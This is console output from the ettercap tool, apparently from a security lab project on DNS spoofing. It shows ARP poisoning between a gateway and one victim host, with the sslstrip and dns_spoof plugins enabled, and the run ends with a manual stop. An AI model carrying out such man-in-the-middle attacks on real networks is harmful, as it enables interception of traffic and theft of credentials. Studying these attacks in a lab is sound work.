
[1mettercap 0.8.2[0m copyright 2001-2015 Ettercap Development Team

Listening on:
  eth1 -> 08:00:27:AF:F0:3B
	  192.168.2.12/255.255.248.0
	  fe80::a00:27ff:feaf:f03b/64
	  2a02:a449:5545:1:a00:27ff:feaf:f03b/64
	  2a02:a449:5545:1:e57f:b834:768c:f220/64

Privileges dropped to EUID 65534 EGID 65534...

  33 plugins
  42 protocol dissectors
  57 ports monitored
20388 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Loading hosts list from file /root/Desktop/security-project/dns-spoofing/ettercap/victims
2 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : 192.168.2.254 34:4D:EA:88:24:A4

 GROUP 2 : 192.168.2.13 08:00:27:46:4E:B4
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help

Activating sslstrip plugin...

SSLStrip plugin: bind 80 on 59273
SSLStrip Plugin version 1.1 is still under experimental mode. Please reports any issues to the development team.
Activating dns_spoof plugin...



Sat Oct 26 08:12:04 2019 [253653]
  192.168.2.13:0 --> 192.168.2.254:0 |  (0)


User requested a CTRL+C... (deprecated, next time use proper shutdown)


